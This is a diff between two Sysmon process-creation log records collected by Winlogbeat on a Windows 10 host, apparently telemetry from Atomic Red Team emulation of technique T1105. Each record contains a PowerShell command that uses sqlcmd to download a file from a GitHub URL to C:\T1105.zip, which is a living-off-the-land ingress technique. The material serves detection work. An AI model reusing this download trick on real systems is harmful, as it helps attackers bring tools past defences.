@@ -1,9 +1,9 @@
 {
   "@timestamp": [
-    "2025-09-08T15:05:32.639Z"
+    "2025-09-13T16:32:07.028Z"
   ],
   "agent.ephemeral_id": [
-    "c80f7487-964b-47a2-805c-2c8f2ca7b6c8"
+    "e6763cba-c455-4a54-8e75-25782674cdee"
   ],
   "agent.hostname": [
     "windows10"
@@ -33,10 +33,10 @@
     "1"
   ],
   "event.created": [
-    "2025-09-08T15:05:33.412Z"
+    "2025-09-13T16:32:08.544Z"
   ],
   "event.ingested": [
-    "2025-09-08T15:06:26.669Z"
+    "2025-09-13T16:32:39.863Z"
   ],
   "event.kind": [
     "event"
@@ -60,8 +60,8 @@
     "9602231e-bedc-4571-bb7f-bfa9fca7b1e1"
   ],
   "host.ip": [
-    "2c0f:4280:6040:1cf:401d:7860:8b6:8fc1",
-    "2c0f:4280:6040:1cf:5ea0:9e86:494e:6e7e",
+    "2c0f:4280:0:647:24f4:b395:9514:896f",
+    "2c0f:4280:0:647:4b62:234d:56ee:bb88",
     "fe80::5588:11c4:b507:8fc7",
     "192.168.100.161"
   ],
@@ -72,13 +72,13 @@
     "windows10"
   ],
   "host.os.build": [
-    "19045.6216"
+    "19045.6332"
   ],
   "host.os.family": [
     "windows"
   ],
   "host.os.kernel": [
-    "10.0.19041.6216 (WinBuild.160101.0800)"
+    "10.0.19041.6328 (WinBuild.160101.0800)"
   ],
   "host.os.name": [
     "Windows 10 Enterprise Evaluation"
@@ -99,7 +99,7 @@
     "information"
   ],
   "message": [
-    "Process Create:\nRuleName: -\nUtcTime: 2025-09-08 15:05:32.639\nProcessGuid: {9602231E-F0BC-68BE-1004-000000002F00}\nProcessId: 1556\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nFileVersion: 10.0.19041.3996 (WinBuild.160101.0800)\nDescription: Windows PowerShell\nProduct: Microsoft® Windows® Operating System\nCompany: Microsoft Corporation\nOriginalFileName: PowerShell.EXE\nCommandLine: \"powershell.exe\" & {sqlcmd -i https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1105/src/T1105.zip -o C:\\T1105.zip}\nCurrentDirectory: C:\\Users\\KHAIRE~1\\AppData\\Local\\Temp\\\nUser: WINDOWS10\\khaireddine\nLogonGuid: {9602231E-B737-68BE-C846-020000000000}\nLogonId: 0x246c8\nTerminalSessionId: 1\nIntegrityLevel: High\nHashes: SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3,IMPHASH=3D08F4848535206D772DE145804FF4B6\nParentProcessGuid: {9602231E-D3D0-68BE-0403-000000002F00}\nParentProcessId: 6284\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nParentCommandLine: \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" \nParentUser: WINDOWS10\\khaireddine"
+    "Process Create:\nRuleName: -\nUtcTime: 2025-09-13 16:32:07.028\nProcessGuid: {9602231E-9C87-68C5-EE01-000000003800}\nProcessId: 7948\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nFileVersion: 10.0.19041.3996 (WinBuild.160101.0800)\nDescription: Windows PowerShell\nProduct: Microsoft® Windows® Operating System\nCompany: Microsoft Corporation\nOriginalFileName: PowerShell.EXE\nCommandLine: \"powershell.exe\" & {sqlcmd -i https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1105/src/T1105.zip -o C:\\T1105.zip}\nCurrentDirectory: C:\\Users\\KHAIRE~1\\AppData\\Local\\Temp\\\nUser: WINDOWS10\\khaireddine\nLogonGuid: {9602231E-8E48-68C5-D022-030000000000}\nLogonId: 0x322d0\nTerminalSessionId: 1\nIntegrityLevel: High\nHashes: SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3,IMPHASH=3D08F4848535206D772DE145804FF4B6\nParentProcessGuid: {00000000-0000-0000-0000-000000000000}\nParentProcessId: 3076\nParentImage: -\nParentCommandLine: -\nParentUser: -"
   ],
   "process.args": [
     "powershell.exe",
@@ -120,7 +120,7 @@
     "\"powershell.exe\" & {sqlcmd -i https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1105/src/T1105.zip -o C:\\T1105.zip}"
   ],
   "process.entity_id": [
-    "{9602231E-F0BC-68BE-1004-000000002F00}"
+    "{9602231E-9C87-68C5-EE01-000000003800}"
   ],
   "process.executable": [
     "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
@@ -137,35 +137,8 @@
   "process.name.text": [
     "powershell.exe"
   ],
-  "process.parent.args": [
-    "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
-  ],
-  "process.parent.args_count": [
-    1
-  ],
-  "process.parent.command_line": [
-    "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" "
-  ],
-  "process.parent.command_line.text": [
-    "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" "
-  ],
-  "process.parent.entity_id": [
-    "{9602231E-D3D0-68BE-0403-000000002F00}"
-  ],
-  "process.parent.executable": [
-    "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
-  ],
-  "process.parent.executable.text": [
-    "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
-  ],
-  "process.parent.name": [
-    "powershell.exe"
-  ],
-  "process.parent.name.text": [
-    "powershell.exe"
-  ],
   "process.parent.pid": [
-    6284
+    3076
   ],
   "process.pe.company": [
     "Microsoft Corporation"
@@ -186,7 +159,7 @@
     "Microsoft® Windows® Operating System"
   ],
   "process.pid": [
-    1556
+    7948
   ],
   "process.working_directory": [
     "C:\\Users\\KHAIRE~1\\AppData\\Local\\Temp\\"
@@ -232,13 +205,10 @@
     "High"
   ],
   "winlog.event_data.LogonGuid": [
-    "{9602231E-B737-68BE-C846-020000000000}"
+    "{9602231E-8E48-68C5-D022-030000000000}"
   ],
   "winlog.event_data.LogonId": [
-    "0x246c8"
-  ],
-  "winlog.event_data.ParentUser": [
-    "WINDOWS10\\khaireddine"
+    "0x322d0"
   ],
   "winlog.event_data.Product": [
     "Microsoft® Windows® Operating System"
@@ -253,10 +223,10 @@
     "Info"
   ],
   "winlog.process.pid": [
-    3128
+    2772
   ],
   "winlog.process.thread.id": [
-    4032
+    1300
   ],
   "winlog.provider_guid": [
     "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"
@@ -265,7 +235,7 @@
     "Microsoft-Windows-Sysmon"
   ],
   "winlog.record_id": [
-    "407112"
+    "590112"
   ],
   "winlog.task": [
     "Process Create (rule: ProcessCreate)"
@@ -285,7 +255,7 @@
   "winlog.version": [
     5
   ],
-  "_id": "RxndKZkBBIzTpjLGNDKf",
+  "_id": "PEXrQ5kByX9HBM178BJe",
   "_index": ".ds-winlogbeat-9.1.2-2025.08.17-000001",
   "_score": null
 }
